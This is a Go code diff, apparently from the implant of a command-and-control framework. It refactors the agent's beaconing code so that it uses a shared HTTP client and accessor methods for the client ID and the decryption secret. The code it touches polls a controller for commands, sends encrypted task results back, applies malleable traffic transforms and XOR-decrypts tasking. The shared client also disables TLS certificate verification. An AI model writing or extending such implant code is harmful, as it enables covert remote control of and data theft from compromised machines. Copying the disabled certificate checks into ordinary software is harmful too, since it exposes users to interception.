@@ -100,6 +100,19 @@ var (
 	rekeyInProgress atomic.Bool // Prevent concurrent rekey operations
 )
 
+// Package-level HTTP client for connection reuse
+var sharedHTTPClient = &http.Client{
+	Transport: &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+		MaxIdleConns:        10,
+		IdleConnTimeout:     90 * time.Second,
+		TLSHandshakeTimeout: 10 * time.Second,
+	},
+	Timeout: time.Second * 30,
+}
+
 func init() {
 	commandQueue = NewCommandQueue()
 	resultManager = NewResultManager()
@@ -262,7 +275,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 
 	// Apply clientID transforms if configured
 	if postClientIDDataBlock != nil && len(postClientIDDataBlock.Transforms) > 0 {
-		transformed, err := applyTransforms([]byte(clientID), postClientIDDataBlock.Transforms)
+		transformed, err := applyTransforms([]byte(getClientID()), postClientIDDataBlock.Transforms)
 		if err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
@@ -288,14 +301,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 		req.Header.Set(key, value)
 	}
 
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-			},
-		},
-		Timeout: time.Second * 30,
-	}
+	client := sharedHTTPClient
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -332,13 +338,13 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// Apply clientID transforms if configured
 	if getClientIDDataBlock != nil {
 		if len(getClientIDDataBlock.Transforms) > 0 {
-			transformed, err := applyTransforms([]byte(clientID), getClientIDDataBlock.Transforms)
+			transformed, err := applyTransforms([]byte(getClientID()), getClientIDDataBlock.Transforms)
 			if err != nil {
 				return fmt.Errorf(ErrCtx(E18, err.Error()))
 			}
 			placeInLocation(req, getClientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
 		} else {
-			placeInLocation(req, getClientIDDataBlock.Output, []byte(clientID), 0, 0)
+			placeInLocation(req, getClientIDDataBlock.Output, []byte(getClientID()), 0, 0)
 		}
 	}
 
@@ -347,15 +353,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		req.Header.Set(key, value)
 	}
 
-	// Create HTTP client with TLS config
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-			},
-		},
-		Timeout: time.Second * 30,
-	}
+	client := sharedHTTPClient
 
 	// Send request
 	resp, err := client.Do(req)
@@ -415,8 +413,8 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
 
-		currentSecret := secureComms.secret1
-		xorKey := deriveXORKey(clientID, currentSecret)
+		currentSecret := secureComms.GetDecryptionSecret()
+		xorKey := deriveXORKey(getClientID(), currentSecret)
 		decrypted := xorDecryptBytes(body, xorKey)
 
 		if err := json.Unmarshal(decrypted, &responseMap); err != nil {
@@ -436,8 +434,8 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			// Likely encrypted, try to decrypt
 
 			// Get current secret from secureComms
-			currentSecret := secureComms.secret1 // Direct access to field
-			xorKey := deriveXORKey(clientID, currentSecret)
+			currentSecret := secureComms.GetDecryptionSecret()
+			xorKey := deriveXORKey(getClientID(), currentSecret)
 
 			decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
 			if err != nil {
@@ -498,7 +496,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			Command: Command{
 				Command:     getPollStr(idxPollRekey),
 				CommandDBID: commandDBID,
-				AgentID:     clientID,
+				AgentID:     getClientID(),
 			},
 			CompletedAt: time.Now().Format(time.RFC3339),
 			Output:      Succ(S15),
@@ -601,7 +599,7 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	// Build payload with only link data
 	payload := make(map[string]interface{})
-	payload[getPollStr(idxPollAgentId)] = clientID
+	payload[getPollStr(idxPollAgentId)] = getClientID()
 	payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 
 	jsonData, err := json.Marshal(payload)
@@ -839,7 +837,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResp {
 				results := resultManager.GetPendingResults()
 				payload := make(map[string]interface{})
-				payload[getPollStr(idxPollAgentId)] = clientID
+				payload[getPollStr(idxPollAgentId)] = getClientID()
 
 				if len(results) > 0 {
 					payload[getPollStr(idxPollResults)] = results
